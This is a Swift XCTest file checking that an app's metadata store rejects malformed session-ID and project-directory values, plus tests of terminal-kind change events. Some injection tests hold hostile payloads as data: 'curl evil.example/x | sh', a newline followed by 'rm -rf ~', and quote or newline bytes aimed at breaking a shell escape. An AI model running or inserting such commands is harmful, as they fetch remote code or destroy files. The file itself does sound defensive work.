import Combine
import XCTest

#if canImport(c11_DEV)
@testable import c11_DEV
#elseif canImport(c11)
@testable import c11
#endif

/// Integration tests for the write-time validator guarding the
/// `claude.session_id` reserved key (CMUX-37 Phase 1 / B1).
///
/// The registry tests in `AgentRestartRegistryTests` cover the resolver's
/// defensive re-validation. These tests cover the other half of the
/// defence: the store must reject malformed writes so a malicious value
/// never lands in the metadata blob in the first place.
///
/// Per `CLAUDE.md`, never run locally — CI only.
final class SurfaceMetadataStoreValidationTests: XCTestCase {

    private let store = SurfaceMetadataStore.shared

    func testStoreAcceptsValidUUIDv4ClaudeSessionId() throws {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let result = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "abc12345-ef67-890a-bcde-f0123456789a"],
            mode: .merge,
            source: .explicit
        )
        XCTAssertEqual(result.applied["claude.session_id"], true)
    }

    func testStoreRejectsShellInjectionInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "fake; curl evil.example/x | sh"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsEmbeddedNewlineInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "abc12345-ef67-890a-bcde-f0123456789a\nrm -rf ~"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonStringClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": 42],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonUUIDShapes() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let shapes = [
            "too-short",
            "aaaaaaaa-1111-2222-3333", // missing last segment
            "aaaaaaaa-1111-2222-3333-444455556666ff", // last segment too long
            "AAAAAAAA_1111_2222_3333_444455556666", // underscores
            "gggggggg-1111-2222-3333-444455556666", // non-hex g
            "",
            " "
        ]
        for shape in shapes {
            XCTAssertThrowsError(
                try store.setMetadata(
                    workspaceId: workspace,
                    surfaceId: surface,
                    partial: ["claude.session_id": shape],
                    mode: .merge,
                    source: .explicit
                ),
                "store must reject '\(shape)'"
            )
        }
    }

    /// Store state must stay empty after rejected writes — the throw is
    /// supposed to happen before mutation per the reserved-key pre-check.
    func testRejectedWriteLeavesStoreUntouched() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        _ = try? store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "not a uuid"],
            mode: .merge,
            source: .explicit
        )
        let (metadata, sources) = store.getMetadata(workspaceId: workspace, surfaceId: surface)
        XCTAssertNil(metadata["claude.session_id"])
        XCTAssertNil(sources["claude.session_id"])
    }

    // MARK: - claude.session_project_dir

    func testStoreAcceptsAbsolutePosixProjectDir() throws {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let result = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_project_dir": "/Users/op/repo/c11-worktrees/feat"],
            mode: .merge,
            source: .explicit
        )
        XCTAssertEqual(result.applied["claude.session_project_dir"], true)
    }

    func testStoreRejectsRelativeProjectDir() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_project_dir": "relative/path"],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsProjectDirWithSingleQuoteOrNewline() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        // A single quote would break the registry's single-quote shell
        // escape; a newline would let an attacker append a second command
        // after the synthesized `cd ... && claude --resume`.
        let payloads = [
            "/path/with'quote",
            "/path/with\nnewline",
            "/path/with\rcr",
            "/path/with\u{0000}nul"
        ]
        for payload in payloads {
            XCTAssertThrowsError(
                try store.setMetadata(
                    workspaceId: workspace,
                    surfaceId: surface,
                    partial: ["claude.session_project_dir": payload],
                    mode: .merge,
                    source: .explicit
                ),
                "store must reject project_dir containing dangerous bytes"
            )
        }
    }

    func testStoreRejectsNonStringProjectDir() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_project_dir": 42],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    // MARK: - Typed terminal-kind transitions

    func testTerminalKindStreamPublishesMergeAndReplaceRemovalOnlyForEffectiveChanges() throws {
        let workspace = UUID()
        let surface = UUID()
        var changes: [TerminalKindChange] = []
        let cancellable = store.terminalKindChanges
            .filter { $0.workspaceID == workspace && $0.surfaceID == surface }
            .sink { changes.append($0) }
        defer {
            cancellable.cancel()
            store.removeSurface(workspaceId: workspace, surfaceId: surface)
        }

        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "codex"],
            mode: .merge,
            source: .explicit
        )
        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "codex"],
            mode: .merge,
            source: .explicit
        )
        let rejected = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "claude-code"],
            mode: .merge,
            source: .heuristic
        )
        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.title: "Terminal"],
            mode: .replace,
            source: .explicit
        )

        XCTAssertEqual(rejected.applied[MetadataKey.terminalType], false)
        XCTAssertEqual(
            changes,
            [
                TerminalKindChange(
                    workspaceID: workspace,
                    surfaceID: surface,
                    oldKind: nil,
                    newKind: "codex",
                    origin: .merge,
                    source: .explicit
                ),
                TerminalKindChange(
                    workspaceID: workspace,
                    surfaceID: surface,
                    oldKind: "codex",
                    newKind: nil,
                    origin: .replace,
                    source: .explicit
                )
            ]
        )
    }

    func testTerminalKindStreamDistinguishesKeyedAndClearAllOrigins() throws {
        let workspace = UUID()
        let surface = UUID()
        var changes: [TerminalKindChange] = []
        let cancellable = store.terminalKindChanges
            .filter { $0.workspaceID == workspace && $0.surfaceID == surface }
            .sink { changes.append($0) }
        defer {
            cancellable.cancel()
            store.removeSurface(workspaceId: workspace, surfaceId: surface)
        }

        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "codex"],
            mode: .merge,
            source: .explicit
        )
        changes.removeAll()
        _ = try store.clearMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            keys: [MetadataKey.terminalType],
            source: .explicit
        )
        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "claude-code"],
            mode: .merge,
            source: .explicit
        )
        changes.removeAll()
        _ = try store.clearMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            keys: nil,
            source: .explicit
        )

        XCTAssertEqual(changes.count, 1)
        XCTAssertEqual(changes.first?.oldKind, "claude-code")
        XCTAssertNil(changes.first?.newKind)
        XCTAssertEqual(changes.first?.origin, .clearAll)

        _ = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: [MetadataKey.terminalType: "codex"],
            mode: .merge,
            source: .explicit
        )
        changes.removeAll()
        _ = try store.clearMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            keys: [MetadataKey.terminalType],
            source: .explicit
        )
        XCTAssertEqual(changes.count, 1)
        XCTAssertEqual(changes.first?.origin, .keyedClear)
    }

    func testTerminalKindStreamCoversInternalAndRestoreOriginsWithoutNoOpPublication() {
        let workspace = UUID()
        let surface = UUID()
        var changes: [TerminalKindChange] = []
        let cancellable = store.terminalKindChanges
            .filter { $0.workspaceID == workspace && $0.surfaceID == surface }
            .sink { changes.append($0) }
        defer {
            cancellable.cancel()
            store.removeSurface(workspaceId: workspace, surfaceId: surface)
        }

        XCTAssertTrue(
            store.setInternal(
                workspaceId: workspace,
                surfaceId: surface,
                key: MetadataKey.terminalType,
                value: "codex",
                source: .declare
            )
        )
        XCTAssertTrue(
            store.setInternal(
                workspaceId: workspace,
                surfaceId: surface,
                key: MetadataKey.terminalType,
                value: "codex",
                source: .explicit
            )
        )
        store.restoreFromSnapshot(
            workspaceId: workspace,
            surfaceId: surface,
            values: [MetadataKey.terminalType: "shell"],
            sources: [
                MetadataKey.terminalType: SurfaceMetadataStore.SourceRecord(
                    source: .heuristic,
                    ts: 42
                )
            ]
        )
        store.restoreFromSnapshot(
            workspaceId: workspace,
            surfaceId: surface,
            values: [MetadataKey.terminalType: "shell"],
            sources: [
                MetadataKey.terminalType: SurfaceMetadataStore.SourceRecord(
                    source: .heuristic,
                    ts: 43
                )
            ]
        )

        XCTAssertEqual(changes.count, 2)
        XCTAssertEqual(changes[0].oldKind, nil)
        XCTAssertEqual(changes[0].newKind, "codex")
        XCTAssertEqual(changes[0].origin, .internalWrite)
        XCTAssertEqual(changes[0].source, .declare)
        XCTAssertEqual(changes[1].oldKind, "codex")
        XCTAssertEqual(changes[1].newKind, "shell")
        XCTAssertEqual(changes[1].origin, .restore)
        XCTAssertEqual(changes[1].source, .heuristic)
    }
}
